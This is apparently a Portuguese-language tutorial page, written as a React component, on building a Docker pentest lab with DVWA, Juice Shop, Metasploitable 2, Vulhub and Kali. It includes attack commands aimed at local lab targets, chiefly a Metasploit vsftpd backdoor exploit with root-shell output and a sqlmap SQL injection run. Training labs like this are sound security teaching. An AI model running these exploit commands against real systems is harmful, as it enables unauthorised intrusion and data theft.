import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function DockerKali() {
  return (
    <PageContainer
      title="Docker para labs de pentest"
      subtitle="Subir DVWA, Metasploitable, Juice Shop, Vulhub e Kali em minutos. Lab inteiro reproducível com docker-compose."
      difficulty="intermediario"
      timeToRead="15 min"
      prompt="lab/docker"
    >
      <h2>Instalação no Kali</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "Kali tem o docker.io no repo (versão upstream da Debian)",
            cmd: "sudo apt update && sudo apt install -y docker.io docker-compose-v2",
            out: `Reading package lists... Done
The following NEW packages will be installed:
  docker.io docker-compose-v2 containerd runc
Need to get 84.5 MB of archives.
[...]
Setting up docker.io (26.1.3+dfsg1-1) ...
Created symlink /etc/systemd/system/multi-user.target.wants/docker.service`,
            outType: "success",
          },
          {
            cmd: "sudo systemctl enable --now docker",
            out: "Synchronizing state of docker.service with SysV service script with /lib/systemd/systemd-sysv-install.",
            outType: "muted",
          },
          {
            comment: "rodar docker SEM sudo — adicionar seu user ao grupo (re-login depois)",
            cmd: "sudo usermod -aG docker $USER && newgrp docker",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "docker version && docker run --rm hello-world | head -10",
            out: `Client: Docker Engine - Community
 Version:           26.1.3
 API version:       1.45
Server: Docker Engine - Community
 Version:           26.1.3

Hello from Docker!
This message shows that your installation appears to be working correctly.`,
            outType: "info",
          },
        ]}
      />

      <h2>DVWA (Damn Vulnerable Web App)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "docker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa",
            out: `Unable to find image 'vulnerables/web-dvwa:latest' locally
latest: Pulling from vulnerables/web-dvwa
b234f539f7a1: Pull complete
[...]
Status: Downloaded newer image for vulnerables/web-dvwa:latest
9a7f3b21dee4c1f8e3a94b18a5e7d31a15a23921`,
            outType: "success",
          },
          {
            cmd: "docker ps",
            out: `CONTAINER ID   IMAGE                  PORTS                  NAMES
9a7f3b21dee4   vulnerables/web-dvwa   0.0.0.0:8080->80/tcp   dvwa`,
            outType: "info",
          },
          {
            cmd: "curl -s http://localhost:8080/login.php | grep -oP '<title>[^<]+' ",
            out: "<title>Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*",
            outType: "default",
          },
          {
            comment: "credenciais default: admin / password — depois Setup → Create Database",
            cmd: "firefox http://localhost:8080 &",
            out: "(browser abre)",
            outType: "muted",
          },
        ]}
      />

      <h2>OWASP Juice Shop (web app moderna)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "docker run -d --name juice -p 3000:3000 bkimminich/juice-shop",
            out: `latest: Pulling from bkimminich/juice-shop
[...]
Status: Downloaded newer image for bkimminich/juice-shop:latest
b94f8e2c7a31ca91b1d8ec22e8b7c1f0ad14b8e4ab`,
            outType: "success",
          },
          {
            cmd: "docker logs juice 2>&1 | tail -10",
            out: `info: Configuration default validated
info: Server listening on port 3000
info: Required file dist/frontend/main.js found.

       o.OOOOOOOOOOOOOOOOOOOOOO.o
        OOOOOOOOOOOOOOOOOOOOOOOO
            OOOOOOOOOOOOOOOOOOOO

      Welcome to OWASP Juice Shop`,
            outType: "info",
          },
          {
            cmd: "firefox http://localhost:3000 &",
            out: "(SPA Angular com 100+ desafios — score board oculto na URL /score-board)",
            outType: "muted",
          },
        ]}
      />

      <h2>Metasploitable 2 / 3</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "Metasploitable 2 (Linux clássico)",
            cmd: "docker run -d --name msf2 -p 21-25:21-25 -p 80:80 -p 139:139 -p 445:445 -p 3306:3306 -p 5432:5432 tleemcjr/metasploitable2",
            out: `Status: Downloaded newer image for tleemcjr/metasploitable2:latest
71eaab2cf42a12e10bef1ab7a9d88e22fea9c87b3a`,
            outType: "success",
          },
          {
            cmd: "nmap -sV -p 21,22,80,445 localhost",
            out: `Nmap scan report for localhost (127.0.0.1)
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4    ← backdoor!
22/tcp  open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1
80/tcp  open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
445/tcp open  smb     Samba 3.0.20-Debian (workgroup: WORKGROUP)`,
            outType: "warning",
          },
          {
            comment: "exploitar imediatamente",
            cmd: "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 127.0.0.1; run'",
            out: `[*] Started bind handler
[*] 127.0.0.1:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 127.0.0.1:21 - USER: 331 Please specify the password.
[+] 127.0.0.1:21 - Backdoor service has been spawned, handling...
[+] 127.0.0.1:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened`,
            outType: "error",
          },
        ]}
      />

      <h2>Vulhub — biblioteca de CVEs</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "Vulhub = 200+ CVEs reproduzíveis em compose",
            cmd: "git clone https://github.com/vulhub/vulhub.git && cd vulhub",
            out: `Cloning into 'vulhub'...
remote: Enumerating objects: 18421, done.
Receiving objects: 100% (18421/18421), 8.42 MiB | 12.41 MiB/s, done.`,
            outType: "muted",
          },
          {
            comment: "exemplo: Log4Shell (CVE-2021-44228)",
            cmd: "cd log4j/CVE-2021-44228 && docker compose up -d",
            out: `[+] Running 1/1
 ✔ Container cve-2021-44228-solr-1  Started   8.4s
[+] Service ready on http://localhost:8983`,
            outType: "success",
          },
          {
            cmd: "ls",
            out: `1.x          activemq             cve-2018-17246
CVE-2017-1000353  cve-2019-3396  CVE-2021-44228 ← Log4Shell
CVE-2021-3129     cve-2022-22965 (Spring4Shell)
[...]`,
            outType: "info",
          },
        ]}
      />

      <h2>Kali em container</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "imagem oficial do Kali — útil para CI/CD ou hosts sem permissão de instalar",
            cmd: "docker pull kalilinux/kali-rolling",
            out: `Using default tag: latest
latest: Pulling from kalilinux/kali-rolling
[...]
Status: Downloaded newer image for kalilinux/kali-rolling:latest`,
            outType: "muted",
          },
          {
            cmd: "docker run -it --rm --name kali --net=host kalilinux/kali-rolling /bin/bash",
            out: "root@kali:/# ",
            outType: "info",
          },
          {
            comment: "dentro do container — instalar ferramentas",
            cmd: "(dentro do container) apt update && apt install -y nmap python3 hydra",
            out: "(instala — container some quando você sair com --rm)",
            outType: "default",
          },
          {
            comment: "para persistir: salvar imagem customizada",
            cmd: "docker commit kali wallyson/kali-recon:v1",
            out: "sha256:8e2c3f4a5b6c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e",
            outType: "success",
          },
        ]}
      />

      <h2>Lab completo com docker-compose</h2>
      <CodeBlock
        language="yaml"
        title="docker-compose.yml — atacante Kali + 3 vítimas em rede isolada"
        code={`services:
  attacker:
    image: kalilinux/kali-rolling
    container_name: kali
    tty: true
    stdin_open: true
    networks:
      labnet:
        ipv4_address: 10.10.10.2
    command: /bin/bash

  dvwa:
    image: vulnerables/web-dvwa
    container_name: dvwa
    networks:
      labnet:
        ipv4_address: 10.10.10.10

  juice:
    image: bkimminich/juice-shop
    container_name: juice
    networks:
      labnet:
        ipv4_address: 10.10.10.20

  msf2:
    image: tleemcjr/metasploitable2
    container_name: msf2
    networks:
      labnet:
        ipv4_address: 10.10.10.30

networks:
  labnet:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.10.0/24`}
      />

      <Terminal
        path="~/lab"
        lines={[
          {
            cmd: "docker compose up -d",
            out: `[+] Running 5/5
 ✔ Network lab_labnet     Created  0.4s
 ✔ Container kali         Started  1.8s
 ✔ Container dvwa         Started  3.1s
 ✔ Container juice        Started  3.4s
 ✔ Container msf2         Started  4.2s`,
            outType: "success",
          },
          {
            cmd: "docker compose ps",
            out: `NAME    IMAGE                       STATUS    NETWORKS    IP
kali    kalilinux/kali-rolling      Up 12s    labnet      10.10.10.2
dvwa    vulnerables/web-dvwa        Up 12s    labnet      10.10.10.10
juice   bkimminich/juice-shop       Up 12s    labnet      10.10.10.20
msf2    tleemcjr/metasploitable2    Up 12s    labnet      10.10.10.30`,
            outType: "info",
          },
          {
            cmd: "docker exec -it kali bash -c 'apt update -qq && apt install -y nmap -qq && nmap -sV 10.10.10.0/24'",
            out: `Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 10.10.10.10  (dvwa)
80/tcp open http Apache 2.4.10
Nmap scan report for 10.10.10.20  (juice)
3000/tcp open http Node.js Express framework
Nmap scan report for 10.10.10.30  (msf2)
21/tcp open ftp vsftpd 2.3.4
22/tcp open ssh OpenSSH 4.7p1
80/tcp open http Apache 2.2.8`,
            outType: "warning",
          },
        ]}
      />

      <h2>Comandos básicos do Docker</h2>
      <CommandTable
        title="Cheatsheet diário"
        variations={[
          { cmd: "docker ps", desc: "Containers rodando.", output: "ID, image, status, ports." },
          { cmd: "docker ps -a", desc: "Inclui parados.", output: "Para limpar: docker rm." },
          { cmd: "docker images", desc: "Imagens baixadas.", output: "Espaço: docker system df." },
          { cmd: "docker logs -f <name>", desc: "Stream de logs.", output: "Como tail -f." },
          { cmd: "docker exec -it <name> bash", desc: "Entra no container.", output: "Shell interativo." },
          { cmd: "docker stop <name>", desc: "Para com SIGTERM.", output: "10s timeout, depois SIGKILL." },
          { cmd: "docker rm <name>", desc: "Remove container parado.", output: "-f para forçar." },
          { cmd: "docker rmi <image>", desc: "Remove imagem.", output: "Precisa não estar em uso." },
          { cmd: "docker compose down", desc: "Para todos do compose.", output: "-v também remove volumes." },
          { cmd: "docker network ls", desc: "Lista redes.", output: "bridge, host, none + custom." },
          { cmd: "docker volume ls", desc: "Volumes persistentes.", output: "Para DB que sobrevive a restart." },
          { cmd: "docker system prune -a", desc: "Apaga TUDO não usado.", output: "Libera espaço pesadamente." },
        ]}
      />

      <PracticeBox
        title="Suba o lab e ataque o DVWA"
        goal="Lab pentest completo em < 5 min: 4 containers em rede isolada + ataque SQLi."
        steps={[
          "Salve o docker-compose.yml acima em ~/lab/.",
          "docker compose up -d.",
          "Entre no Kali atacante: docker exec -it kali bash.",
          "nmap na rede 10.10.10.0/24.",
          "Em outro terminal, configure DVWA (firefox 10.10.10.10 → setup → create db).",
          "Use sqlmap contra o módulo SQLi do DVWA.",
        ]}
        command={`mkdir -p ~/lab && cd ~/lab
# (cole o docker-compose.yml aqui)

docker compose up -d
docker compose ps

# atacante
docker exec -it kali bash
# dentro:
apt install -y nmap sqlmap -qq
nmap -sV 10.10.10.0/24
# (depois de configurar DVWA via browser e logar)
sqlmap -u "http://10.10.10.10/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="PHPSESSID=...; security=low" --dbs --batch`}
        expected={`available databases [2]:
[*] dvwa
[*] information_schema`}
        verify="Quando terminar: docker compose down -v (apaga tudo, lab some sem deixar lixo)."
      />

      <AlertBox type="warning" title="Cuidado com -p (port mapping)">
        Quando você faz <code>-p 8080:80</code>, o serviço vulnerável fica acessível DA SUA REDE
        (todos os IPs do host). Use <code>-p 127.0.0.1:8080:80</code> para limitar a localhost,
        ou subnet isolada via <code>networks:</code> no compose como mostrado acima.
      </AlertBox>

      <AlertBox type="info" title="Vulhub é seu melhor amigo">
        Em vez de procurar "como reproduzir CVE-X", veja primeiro <code>vulhub/CVE-X</code>.
        São 200+ CVEs com docker-compose pronto + README com PoC. Suba, pratique, derrube.
      </AlertBox>
    </PageContainer>
  );
}
